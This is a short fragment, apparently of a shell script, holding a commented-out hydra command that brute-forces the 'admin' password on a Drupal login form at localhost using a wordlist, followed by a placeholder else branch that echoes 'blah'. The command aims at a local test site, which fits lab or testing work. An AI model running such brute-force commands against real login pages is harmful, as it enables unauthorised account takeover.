...
#hydra -l admin -P words/words.txt localhost http-post-form "/node?destination=node:name=^USER^&pass=^PASS^&form_id=user_login_block&form_build_id=form-4f81eea9f5f4743e490ba666f0c32384:Sorry"
else
	echo "blah"
